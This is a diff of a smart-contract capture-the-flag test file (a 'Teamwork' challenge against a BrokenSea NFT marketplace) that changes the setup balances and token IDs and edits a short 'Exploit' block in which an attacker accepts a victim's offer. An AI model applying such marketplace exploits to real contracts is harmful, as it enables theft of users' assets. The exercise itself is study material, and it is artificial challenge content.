@@ -7,7 +7,7 @@ describe('[Challenge] Teamwork', function () {
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        
         [deployer, attacker, victim] = await ethers.getSigners();
 
         const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
@@ -17,13 +17,13 @@ describe('[Challenge] Teamwork', function () {
         this.token = await DamnValuableToken.deploy();
         this.nft = await DamnValuableNFTFactory.deploy();
         this.brokenSea = await BrokenSeaFactory.deploy();
-
-        await this.token.transfer(attacker.address, ethers.utils.parseEther('1'));
-
+        //victim 已經擁有 0 - 2 號 NFT
         await this.nft.safeMint(victim.address);
         await this.nft.safeMint(victim.address);
         await this.nft.safeMint(victim.address);
-
+        //attacker 擁有一些 要用來交易的erc20 Token
+        await this.token.transfer(attacker.address, ethers.utils.parseEther('3'));
+        // victim 以及 attacker 事先都已經將 NFT 以及 ERC20 approved 給 BrokenSea
         await this.nft.connect(victim).setApprovalForAll(this.brokenSea.address,true);
         await this.token.connect(victim).approve(this.brokenSea.address,ethers.utils.parseEther('1000'));
 
@@ -37,19 +37,19 @@ describe('[Challenge] Teamwork', function () {
 
         expect(
             await this.token.balanceOf(attacker.address)
-        ).to.equal(ethers.utils.parseEther('1'));
+        ).to.equal(ethers.utils.parseEther('3'));
 
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
 
-        await this.brokenSea.connect(victim).createOffer(this.nft.address, 1, this.token.address, 10000);
+        await this.brokenSea.connect(victim).createOffer(this.nft.address, 3, this.token.address, 10000);
 
         await this.brokenSea.connect(attacker).acceptOffer(
             victim.address,
             this.token.address,
-            1,
+            3,
             this.nft.address,
             1
         );
